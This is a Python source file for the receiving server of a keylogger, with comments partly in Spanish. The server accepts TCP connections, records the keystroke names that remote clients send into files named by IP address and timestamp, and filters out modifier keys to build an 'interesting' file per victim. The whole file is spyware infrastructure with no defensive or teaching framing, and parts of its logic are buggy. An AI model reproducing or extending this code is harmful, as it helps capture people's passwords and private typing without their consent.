#__LIBRARIES__#
import socket, sys, threading, os
from datetime import datetime

#__AUXILIARS__#
def rec_info(addr, conn):
    print('Recording Start!')
    keys = list()
    date = datetime.now().strftime('%x').replace('/', '-')
    time = datetime.now().strftime('%X')
    file_name = '%s_%s_%s.txt' %(addr[0], date, time)
    fw = open(file_name, 'w')
    while True:
        while len(keys) < 50:
            key = str(conn.recv(1024)).split('\'')[1]
            keys.append(key)
            print(len(keys), key)
            if key == 'space':
                key = ' '
            elif key == 'Return':
                key = '\n'
            elif key == 'Tecla num. [65027]':
                key = 'AltGr'
            print(key)
            if len(key) == 1:
                fw.write('%s ' %(key))
            else:
                fw.write('%s' %(key))
        fw.close()
        analize_file = threading.Thread(target=analize, args=(addr[0],))
        analize_file.start()
        keys=list()
        date = datetime.now().strftime('%x').replace('/', '-')
        time = datetime.now().strftime('%X')
        file_name = '%s_%s_%s.txt' %(addr[0], date, time)
        fw = open(file_name, 'w')
        

def analize(ip):
    c_dir = os.getcwd()
    dir = os.listdir(c_dir)
    inter = '%s_interesting.txt' %(ip)
    irrelevant=['Tab', 'Control_L', 'Control_R', 'Alt_L',
                'Menu', 'Insert', 'Home', 'End', 'Pause',
                'Page_Up', 'Next', 'Escape', 'Scroll_Lock'
    ]
    for file in dir:
        info = list()
        if '.txt' in file:
            with open(file, 'r').readlines() as fr:
                for line in fr:
                    for word in line.split():
                        if word not in irrelevant:
                            info.append(word)
            n = 5
            m = len(info)
            with open(inter, 'a') as fa:
                for i in range(0, m, 5):
                    try:
                        fa.write(' '.join(info[i:n]))
                        n += i
                    except IndexError:
                        fa.write(' '.join(info[i:]))
                        break
                else:
                    if m % 5 != 0:
                        fa.write(' '.join(info[n:]))
                fa.close()
                
#__MAIN CODE__#
def server(ip, port, n_c=5):
    serv = socket.socket(
        socket.AF_INET, 
        socket.SOCK_STREAM
    )
    try:
        serv.bind((ip, port))
        serv.listen(n_c)
        serv.settimeout(300)
        while True:
            conn, addr = serv.accept()
            print(conn.recv(1024))
            th = threading.Thread(target=rec_info, args=(addr, conn))
            th.start()
    except Exception:
        sys.exit()
    

#__Main Run__#
server(sys.argv[1], int(sys.argv[2]))


#__NOTAS__#
'''

'''

#__BIBLIOGRAPHY__#
'''

'''